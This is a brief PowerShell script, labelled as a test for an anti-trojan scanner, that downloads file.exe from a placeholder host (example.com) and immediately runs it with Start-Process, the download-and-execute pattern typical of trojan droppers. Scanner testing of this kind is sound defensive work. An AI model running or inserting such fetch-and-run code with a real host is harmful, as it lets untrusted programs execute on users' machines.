# Test script for anti-trojan scanner

Write-Host "Starting script..."

$web = New-Object System.Net.WebClient
$url = "http://example.com/file.exe"

Write-Host "Downloading file..."

$web.DownloadFile($url, "downloaded.exe")

Start-Process "downloaded.exe"
